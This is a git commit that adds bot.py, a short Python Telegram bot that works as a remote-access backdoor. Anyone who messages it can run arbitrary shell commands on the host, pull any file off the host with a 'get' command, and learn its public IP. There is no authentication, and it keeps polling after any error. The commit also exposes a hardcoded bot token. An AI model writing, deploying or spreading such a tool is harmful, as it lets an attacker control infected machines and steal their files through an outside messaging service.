18aaa6b033c75c8831ca3858c0bdf63ba6b0f675
Sovenok-Hacker <79601745+Sovenok-Hacker@users.noreply.github.com>
2022-01-14 18:30:44 +0300

    Add files via upload

---
+++ bot.py
@@ -0,0 +1,21 @@
+import telebot, pysyscom, requests
+token = '1802070719:AAGMEftXpY2S4VBoN0XUlj6RHpB90jk-Leo'
+bot = telebot.TeleBot(token)
+@bot.message_handler(content_types=['text'])
+def handle(message):
+    if message.text.startswith('get'):
+        filename = ''.join(message.text.split('get '))
+        bot.send_document(message.from_user.id, open(filename, 'rb').read(), filename=filename)
+    elif message.text == 'ip':
+        bot.send_message(message.from_user.id, requests.get('https://ifconfig.me/ip').text)
+    else:
+        try:
+            bot.send_message(message.from_user.id, pysyscom.shell(message.text))
+        except Exception as e:
+            bot.send_message(message.from_user.id, f'Error: {e}.')
+while True:
+    try:
+        print('run')
+        bot.polling()
+    except:
+        pass
